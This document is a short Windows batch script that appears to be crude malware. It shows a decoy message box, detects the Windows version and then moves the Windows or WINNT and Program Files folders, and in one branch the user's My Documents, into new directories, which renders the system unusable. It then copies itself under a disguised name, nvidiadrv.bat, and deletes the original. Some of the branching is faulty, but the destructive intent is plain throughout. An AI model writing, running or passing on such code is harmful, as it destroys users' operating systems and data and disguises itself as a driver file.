@echo off
cls
echo MsgBox "This application work only in these OS:NT and 9x",64,"INFO" > > c:\win.vbs
start c:\win.vbs
goto win9xcheck
:win9xcheck
if exist c:\windows\startm~1\programs\startup goto win9x1
if not exist c:\windows\startm~1\programs\startup goto Win2kcheck
:win2kcheck
If exist c:\winnt goto win2kprt1 
If not exist c:\winnt goto winxpcheck
:winxpcheck
If exist c:\windows goto Winxp
:win9x1
cd\
mkdir news
move windows news
move program files news
:win2kprt1
mkdir new
move WINNT new
move program files new
cd\Documents and Settings
cd\documents and settings\All Users
cd\documents and settings\all users\desktop
mkdir all
move My Documents all
cd C:\
Winxp
mkdir programfiles1
move windows programfiles1
move Program Files programfiles1
goto winall
:winall
mkdir drivers-pc
copy %0 c:\drivers-pc\nvidiadrv.bat
del %0